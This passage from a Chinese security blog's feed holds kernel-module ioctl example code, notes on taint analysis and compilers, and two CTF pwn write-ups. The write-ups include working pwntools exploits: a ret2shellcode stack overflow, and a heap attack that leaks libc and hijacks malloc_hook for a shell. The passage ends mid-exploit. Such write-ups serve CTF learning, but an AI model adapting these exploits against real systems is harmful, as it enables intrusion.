<p><code>userspace_ioctl.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  userspace_ioctl.c - the process to use ioctl&#x27;s to control the kernel module </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *  Until now we could have used cat for input and output.  But now </span></span><br><span class="line"><span class="comment"> *  we need to do ioctl&#x27;s, which require writing our own process.  </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* device specifics, such as ioctl numbers and the  </span></span><br><span class="line"><span class="comment"> * major device file. */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../chardev.h&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">/* standard I/O */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span> <span class="comment">/* open */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">/* close */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> <span class="comment">/* exit */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span> <span class="comment">/* ioctl */</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Functions for the ioctl calls */</span> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_set_msg</span><span class="params">(<span class="type">int</span> file_desc, <span class="type">char</span> *message)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> ret_val; </span><br><span class="line"> </span><br><span class="line">    ret_val = ioctl(file_desc, IOCTL_SET_MSG, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ioctl_set_msg failed:%d\n&quot;</span>, ret_val); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret_val; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_get_msg</span><span class="params">(<span class="type">int</span> file_desc)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> ret_val; </span><br><span class="line">    <span class="type">char</span> message[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Warning - this is dangerous because we don&#x27;t tell  </span></span><br><span class="line"><span class="comment">   * the kernel how far it&#x27;s allowed to write, so it  </span></span><br><span class="line"><span class="comment">   * might overflow the buffer. In a real production  </span></span><br><span class="line"><span class="comment">   * program, we would have used two ioctls - one to tell </span></span><br><span class="line"><span class="comment">   * the kernel the buffer length and another to give  </span></span><br><span class="line"><span class="comment">   * it the buffer to fill </span></span><br><span class="line"><span class="comment">   */</span> </span><br><span class="line">    ret_val = ioctl(file_desc, IOCTL_GET_MSG, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ioctl_get_msg failed:%d\n&quot;</span>, ret_val); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_msg message:%s&quot;</span>, message); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret_val; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl_get_nth_byte</span><span class="params">(<span class="type">int</span> file_desc)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> i, c; </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_nth_byte message:&quot;</span>); </span><br><span class="line"> </span><br><span class="line">    i = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">do</span> &#123; </span><br><span class="line">        c = ioctl(file_desc, IOCTL_GET_NTH_BYTE, i++); </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nioctl_get_nth_byte failed at the %d&#x27;th byte:\n&quot;</span>, i); </span><br><span class="line">            <span class="keyword">return</span> c; </span><br><span class="line">        &#125; </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">putchar</span>(c); </span><br><span class="line">    &#125; <span class="keyword">while</span> (c != <span class="number">0</span>); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Main - Call the ioctl functions */</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">int</span> file_desc, ret_val; </span><br><span class="line">    <span class="type">char</span> *msg = <span class="string">&quot;Message passed by ioctl\n&quot;</span>; </span><br><span class="line"> </span><br><span class="line">    file_desc = open(DEVICE_PATH, O_RDWR); </span><br><span class="line">    <span class="keyword">if</span> (file_desc &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t open device file: %s, error:%d\n&quot;</span>, DEVICE_PATH, </span><br><span class="line">               file_desc); </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    ret_val = ioctl_set_msg(file_desc, msg); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line">    ret_val = ioctl_get_nth_byte(file_desc); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line">    ret_val = ioctl_get_msg(file_desc); </span><br><span class="line">    <span class="keyword">if</span> (ret_val) </span><br><span class="line">        <span class="keyword">goto</span> error; </span><br><span class="line"> </span><br><span class="line">    close(file_desc); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">error: </span><br><span class="line">    close(file_desc); </span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240116115744234.png" alt="image-20240116115744234"></p>
]]></content>
      <tags>
        <tag>内核模块</tag>
      </tags>
  </entry>
  <entry>
    <title>DSE论文笔记</title>
    <url>/posts/25083369.html</url>
    <content><![CDATA[<h1 id="DSE论文笔记"><a href="#DSE论文笔记" class="headerlink" title="DSE论文笔记"></a>DSE论文笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过建立一个比较简单的语法简单中间语言（A simple intermediate language，SIMPIL）。对Dynamic taint analysis和forward symbolic execution进行了讲解。</p>
<h3 id="SIMPIL"><a href="#SIMPIL" class="headerlink" title="SIMPIL"></a>SIMPIL</h3><p><img src="/img/posts/2024-1-5-DSE%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20240105122737426.png" alt="image-20240105122737426"></p>
<p><img src="/img/posts/2024-1-5-DSE%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0.assets/image-20240105122751384.png" alt="image-20240105122751384"></p>
<h2 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h2><p><strong>动态污点分析</strong>：跟踪源头与sink点的信息流。任何由污染源推导的值都是污点（T），其他值看作未污染。</p>
<p><strong>两种错误：</strong></p>
<ul>
<li>overtainted：假阳性</li>
<li>undertainting：假阴性</li>
</ul>
<h3 id="动态污点分析策略"><a href="#动态污点分析策略" class="headerlink" title="动态污点分析策略"></a>动态污点分析策略</h3><h4 id="Taint-Introduction"><a href="#Taint-Introduction" class="headerlink" title="Taint Introduction"></a>Taint Introduction</h4><p>将用户输入作为污染源</p>
<h4 id="Taint-Propagation"><a href="#Taint-Propagation" class="headerlink" title="Taint Propagation"></a>Taint Propagation</h4><h4 id="Taint-Checking"><a href="#Taint-Checking" class="headerlink" title="Taint Checking"></a>Taint Checking</h4><p>查看是否污染</p>
<h2 id="前向符号执行"><a href="#前向符号执行" class="headerlink" title="前向符号执行"></a>前向符号执行</h2><p>前向符号性可以通过建立逻辑表达式分析程序在不同输入下的行为。属于静态分析。</p>
]]></content>
      <tags>
        <tag>DSE</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核模块</title>
    <url>/posts/b78b50e.html</url>
    <content><![CDATA[<h1 id="Linux内核模块"><a href="#Linux内核模块" class="headerlink" title="Linux内核模块"></a>Linux内核模块</h1><h2 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h2><p>GNC C Compiler —&gt; GNU Compiler Collection</p>
<ul>
<li>包括编译器、链接器、binutils、glibc、头文件</li>
<li>支持多种语言（C、C++、Java、Go）和多种硬件平台（X86、ARM、MIPS、RISC-V）</li>
</ul>
<h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>编译器的构成</p>
<ul>
<li>Frontend：源码分析、语法检查，输出中间代码</li>
<li>Optimizer：对中间代码进行优化、使其运行更高效</li>
<li>Backend：将中间代码转换为某一个平台的机器代码</li>
</ul>
<p>编译器的实现</p>
<ul>
<li>GCC：前端和后端分离，支持多种语言、多个平台。但缺点：前后端耦合高，代码可重用性低。</li>
<li>LLVM（Low Level Virtual Machine）框架：<strong>模块化设计</strong>，代码可重用性高；中间语言LLVM IR，<strong>类C表达</strong>，<strong>可扩展</strong>各种前端、后端；支持C&#x2F;C++&#x2F;Java等语言</li>
<li>使用LLVM框架的编译器：<ul>
<li>LLVM GCC：前端使用GCC（Apple）</li>
<li>Clang：LLVM+Clang前端（使用C&#x2F;C++）（Apple，Android）</li>
<li>方舟编译器：编译优化（Java虚拟机，效率提高），鸿蒙系统</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>内核模块</tag>
        <tag>交叉编译</tag>
        <tag>gcc</tag>
        <tag>clang</tag>
      </tags>
  </entry>
  <entry>
    <title>【ez_pz_hackover_2016】WriteUp</title>
    <url>/posts/478cb6ca.html</url>
    <content><![CDATA[<h1 id="【ez-pz-hackover-2016】WriteUp"><a href="#【ez-pz-hackover-2016】WriteUp" class="headerlink" title="【ez_pz_hackover_2016】WriteUp"></a>【ez_pz_hackover_2016】WriteUp</h1><p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Pwn</tag>
        <tag>Ret2Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>【babyheap_0ctf_2017】WriteUp</title>
    <url>/posts/d4f04a55.html</url>
    <content><![CDATA[<h1 id="【babyheap-0ctf-2017】WriteUp"><a href="#【babyheap-0ctf-2017】WriteUp" class="headerlink" title="【babyheap_0ctf_2017】WriteUp"></a>【babyheap_0ctf_2017】WriteUp</h1><p><code>checksec</code>查看，保护全开，可以查看是否有堆的漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn18/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>ida查看：</p>
<p><code>main</code>函数提供了菜单以及选择功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        Allocate(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        Fill(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>allocate</code>函数根据大小申请堆空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Allocate</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Fill</code>函数向指定index堆块写入内容，注意此处没有对大小进行限制，因此可以考虑fastbin attack劫持</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Fill</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Dump</code>函数打印指定index的内容，可以用于泄漏main_arena地址，进一步泄漏libc基址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Dump</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此答题思路为unsortedbin attack泄漏libc基址，fastbin attack劫持malloc_hook，使用one_gadget getshell</p>
<h3 id="Step1-泄漏Libc基址"><a href="#Step1-泄漏Libc基址" class="headerlink" title="Step1: 泄漏Libc基址"></a>Step1: 泄漏Libc基址</h3><p>注：当small chunk被释放时，它的fd，bk指向同一个指针即top chunk地址，这个地址保存在main_arena的0x58偏移处，而main_arena在libc的data段中，是全局静态变量，偏移也是固定的，根据这些可以计算出libc的基址。因此只需要当small chunk释放后，还可以打印出其值。</p>
<p>首先申请一些小堆块，然后free掉id 1,2，利用堆溢出漏洞，将chunk2 fd指针修改为chunk4地址，相当于chunk4已经free并且为fastbin，然后要malloc回chunk4,不过由于有大小检查，需要修改chunk4的大小，通过修改chunk3来实现。这样可以实现将small chunk放入fastbin中的效果。注，此时有两个指针指向同一个chunk4，此时将chunk4大小修改回原来值，将正常的chunk4 free掉，就可以令其fd,bk指针指向top_chunk，同时新申请的也指向了chunk4,可以用于查看fd,bk值。由此可以计算出libc值</p>
<h3 id="Step2-修改malloc-hook为one-gadget"><a href="#Step2-修改malloc-hook为one-gadget" class="headerlink" title="Step2: 修改malloc_hook为one_gadget"></a>Step2: 修改malloc_hook为one_gadget</h3><p>使用fastbin attack构造fake chunk修改malloc_hook指针地址即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25147</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">struct &#123;</span></span><br><span class="line"><span class="string">    1, (8) # 表示是否allocate</span></span><br><span class="line"><span class="string">    size: , (8)</span></span><br><span class="line"><span class="string">    content pointer: , (8)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, index)</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">heap overflow</span></span><br><span class="line"><span class="string">1. 泄漏libc基址</span></span><br><span class="line"><span class="string">2. 修改libc中malloc_hook地址为one_gadget</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step1: 泄漏libc基址</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x0000000000001142)&#x27;)</span></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">free(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>, p8(<span class="number">0x80</span>))</span><br><span class="line">fill(<span class="string">b&#x27;0&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">b&#x27;3&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>, <span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">b&#x27;3&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(dump(<span class="string">b&#x27;2&#x27;</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step2: 劫持malloc_hook</span></span><br><span class="line">fake_chunk = libc_addr + <span class="number">0x3c4aed</span></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">payload = flat(fake_chunk)</span><br><span class="line">fill(<span class="string">b&#x27;2&#x27;</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 